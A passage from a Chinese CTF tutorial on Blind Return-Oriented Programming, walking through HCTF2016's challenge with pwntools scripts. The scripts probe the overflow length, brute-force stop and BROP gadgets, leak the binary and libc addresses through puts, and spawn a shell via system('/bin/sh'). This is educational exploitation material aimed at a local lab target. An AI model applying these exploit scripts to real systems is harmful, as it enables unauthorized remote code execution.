只有最后一种格式，程序才会正常执行。

**注**：在没有PIE保护的时候，64位程序的ELF文件的0x400000处有7个非零字节。

那么我们该如何具体地去做呢？有一种比较直接的方法就是从头到尾依次扫描每个plt表项，但是这个却比较麻烦。我们可以选择如下的一种方法

- 利用plt表项的慢路径
- 并且利用下一个表项的慢路径的地址来覆盖返回地址

这样，我们就不用来回控制相应的变量了。 

当然，我们也可能碰巧找到strncmp或者strcasecmp函数，它们具有和strcmp一样的效果。

#### 寻找输出函数

寻找输出函数既可以寻找write，也可以寻找puts。一般现先找puts函数。不过这里为了介绍方便，先介绍如何寻找write。

##### 寻找write@plt

当我们可以控制write函数的三个参数的时候，我们就可以再次遍历所有的plt表，根据write函数将会输出内容来找到对应的函数。需要注意的是，这里有个比较麻烦的地方在于我们需要找到文件描述符的值。一般情况下，我们有两种方法来找到这个值

- 使用rop chain，同时使得每个rop对应的文件描述符不一样
- 同时打开多个连接，并且我们使用相对较高的数值来试一试。

需要注意的是

- linux默认情况下，一个进程最多只能打开1024个文件描述符。
- posix标准每次申请的文件描述符数值总是当前最小可用数值。

当然，我们也可以选择寻找puts函数。

##### 寻找puts@plt

寻找puts函数(这里我们寻找的是 plt)，我们自然需要控制rdi参数，在上面，我们已经找到了brop gadget。那么，我们根据brop gadget偏移9可以得到相应的gadgets（由ret2libc_csu_init中后续可得）。同时在程序还没有开启PIE保护的情况下，0x400000处为ELF文件的头部，其内容为\x7fELF。所以我们可以根据这个来进行判断。一般来说，其payload如下

```
payload = 'A'*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)
```

### 攻击总结

此时，攻击者已经可以控制输出函数了，那么攻击者就可以输出.text段更多的内容以便于来找到更多合适gadgets。同时，攻击者还可以找到一些其它函数，如dup2或者execve函数。一般来说，攻击者此时会去做下事情

- 将socket输出重定向到输入输出
- 寻找“/bin/sh”的地址。一般来说，最好是找到一块可写的内存，利用write函数将这个字符串写到相应的地址。
- 执行execve获取shell，获取execve不一定在plt表中，此时攻击者就需要想办法执行系统调用了。


## 例子

这里我们以HCTF2016的出题人失踪了为例，相关的部署文件都放在了example文件夹下的对应目录下。基本思路如下

### 确定栈溢出长度

```python
def getbufferflow_length():
    i = 1
    while 1:
        try:
            sh = remote('127.0.0.1', 9999)
            sh.recvuntil('WelCome my friend,Do you know password?\n')
            sh.sendline(i * 'a')
            output = sh.recv()
            sh.close()
            if not output.startswith('No password'):
                return i - 1
            else:
                i += 1
        except EOFError:
            sh.close()
            return i - 1
```

根据上面，我们可以确定，栈溢出的长度为72。同时，根据回显信息可以发现程序并没有开启canary保护，否则，就会有相应的报错内容。所以我们不需要执行stack reading。

### 寻找 stop gadgets

寻找过程如下

```python
def get_stop_addr(length):
    addr = 0x400000
    while 1:
        try:
            sh = remote('127.0.0.1', 9999)
            sh.recvuntil('password?\n')
            payload = 'a' * length + p64(addr)
            sh.sendline(payload)
            sh.recv()
            sh.close()
            print 'one success addr: 0x%x' % (addr)
            return addr
        except Exception:
            addr += 1
            sh.close()
```

这里我们直接尝试64位程序没有开启PIE的情况，因为一般是这个样子的，，，如果开启了，，那就按照开启了的方法做，，结果发现了不少，，我选择了一个貌似返回到源程序中的地址

```text
one success stop gadget addr: 0x4006b6
```

### 识别brop gadgets

下面，我们根据上面介绍的原理来得到对应的brop gadgets地址。构造如下，get_brop_gadget是为了得到可能的brop gadget，后面的check_brop_gadget是为了检查。

```python
def get_brop_gadget(length, stop_gadget, addr):
    try:
        sh = remote('127.0.0.1', 9999)
        sh.recvuntil('password?\n')
        payload = 'a' * length + p64(addr) + p64(0) * 6 + p64(
            stop_gadget) + p64(0) * 10
        sh.sendline(payload)
        content = sh.recv()
        sh.close()
        print content
        # stop gadget returns memory
        if not content.startswith('WelCome'):
            return False
        return True
    except Exception:
        sh.close()
        return False


def check_brop_gadget(length, addr):
    try:
        sh = remote('127.0.0.1', 9999)
        sh.recvuntil('password?\n')
        payload = 'a' * length + p64(addr) + 'a' * 8 * 10
        sh.sendline(payload)
        content = sh.recv()
        sh.close()
        return False
    except Exception:
        sh.close()
        return True


#length = getbufferflow_length()
length = 72
#get_stop_addr(length)
stop_gadget = 0x4006b6
addr = 0x400740
while 1:
    print hex(addr)
    if get_brop_gadget(length, stop_gadget, addr):
        print 'possible brop gadget: 0x%x' % addr
        if check_brop_gadget(length, addr):
            print 'success brop gadget: 0x%x' % addr
            break
    addr += 1
```

这样，我们基本得到了brop的gadgets地址0x4007ba

### 确定puts@plt地址

根据上面，所说我们可以构造如下payload来进行获取

```text
payload = 'A'*72 +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)
```

具体函数如下

```python
def get_puts_addr(length, rdi_ret, stop_gadget):
    addr = 0x400000
    while 1:
        print hex(addr)
        sh = remote('127.0.0.1', 9999)
        sh.recvuntil('password?\n')
        payload = 'A' * length + p64(rdi_ret) + p64(0x400000) + p64(
            addr) + p64(stop_gadget)
        sh.sendline(payload)
        try:
            content = sh.recv()
            if content.startswith('\x7fELF'):
                print 'find puts@plt addr: 0x%x' % addr
                return addr
            sh.close()
            addr += 1
        except Exception:
            sh.close()
            addr += 1
```

最后根据plt的结构，选择0x400560作为puts@plt

### 泄露puts@got地址

在我们可以调用puts函数后，我们可以泄露puts函数的地址，进而获取libc版本，从而获取相关的system函数地址与/bin/sh地址，从而获取shell。我们从0x400000开始泄露0x1000个字节，这已经足够包含程序的plt部分了。代码如下

```python
def leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget):
    sh = remote('127.0.0.1', 9999)
    payload = 'a' * length + p64(rdi_ret) + p64(leak_addr) + p64(
        puts_plt) + p64(stop_gadget)
    sh.recvuntil('password?\n')
    sh.sendline(payload)
    try:
        data = sh.recv()
        sh.close()
        try:
            data = data[:data.index("\nWelCome")]
        except Exception:
            data = data
        if data == "":
            data = '\x00'
        return data
    except Exception:
        sh.close()
        return None


#length = getbufferflow_length()
length = 72
#stop_gadget = get_stop_addr(length)
stop_gadget = 0x4006b6
#brop_gadget = find_brop_gadget(length,stop_gadget)
brop_gadget = 0x4007ba
rdi_ret = brop_gadget + 9
#puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)
puts_plt = 0x400560
addr = 0x400000
result = ""
while addr < 0x401000:
    print hex(addr)
    data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)
    if data is None:
        continue
    else:
        result += data
    addr += len(data)
with open('code', 'wb') as f:
    f.write(result)
```

最后，我们将泄露的内容写到文件里。需要注意的是如果泄露出来的是“”,那说明我们遇到了'\x00'，因为puts是输出字符串，字符串是以'\x00'为终止符的。之后利用ida打开binary模式，首先在edit->segments->rebase program 将程序的基地址改为0x400000，然后找到偏移0x560处，如下

```text
seg000:0000000000400560                 db 0FFh
seg000:0000000000400561                 db  25h ; %
seg000:0000000000400562                 db 0B2h ; 
seg000:0000000000400563                 db  0Ah
seg000:0000000000400564                 db  20h
seg000:0000000000400565                 db    0
```

然后按下c,将此处的数据转换为汇编指令，如下

```asm
seg000:0000000000400560 ; ---------------------------------------------------------------------------
seg000:0000000000400560                 jmp     qword ptr cs:601018h
seg000:0000000000400566 ; ---------------------------------------------------------------------------
seg000:0000000000400566                 push    0
seg000:000000000040056B                 jmp     loc_400550
seg000:000000000040056B ; ---------------------------------------------------------------------------
```

这说明，puts@got的地址为0x601018。

### 程序利用

```python
#length = getbufferflow_length()
length = 72
#stop_gadget = get_stop_addr(length)
stop_gadget = 0x4006b6
#brop_gadget = find_brop_gadget(length,stop_gadget)
brop_gadget = 0x4007ba
rdi_ret = brop_gadget + 9
#puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)
puts_plt = 0x400560
addr = 0x400000
#leakfunction(length, rdi_ret, puts_plt, stop_gadget)
puts_got = 0x601018

sh = remote('127.0.0.1', 9999)
sh.recvuntil('password?\n')
payload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(
    stop_gadget)
sh.sendline(payload)
data = sh.recvuntil('\nWelCome', drop=True)
puts_addr = u64(data.ljust(8, '\x00'))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
payload = 'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64(
    system_addr) + p64(stop_gadget)
sh.sendline(payload)
sh.interactive()
```

**参考阅读**

- http://ytliu.info/blog/2014/09/28/blind-return-oriented-programming-brop-attack-gong-ji-yuan-li/
- http://bobao.360.cn/learning/detail/3694.html
- http://o0xmuhe.me/2017/01/22/Have-fun-with-Blind-ROP/

# JOP

Jump-oriented programming

# COP

Call-oriented programming

